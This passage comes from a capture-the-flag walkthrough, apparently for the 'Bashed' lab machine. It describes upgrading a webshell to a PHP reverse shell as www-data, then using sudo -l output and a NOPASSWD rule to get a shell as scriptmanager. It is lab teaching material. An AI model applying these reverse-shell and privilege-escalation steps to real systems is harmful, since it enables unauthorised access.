## Shell upgrade
* The webshell is great and all, but having an actual terminal shell would be great
* Upload the php-reverse-shell.php file to the uploads directory, then start a listener on our machine and visit the page for a shell as www-data
* Run sudo -l to see what files we can run as super user
```bash
www-data@bashed:/$ sudo -l 
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
www-data@bashed:/$
```
* See that we can run any command as user scriptmanager, so get a shell as that user
```bash
www-data@bashed:/$ sudo -u scriptmanager /bin/bash
scriptmanager@bashed:/$ id
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
```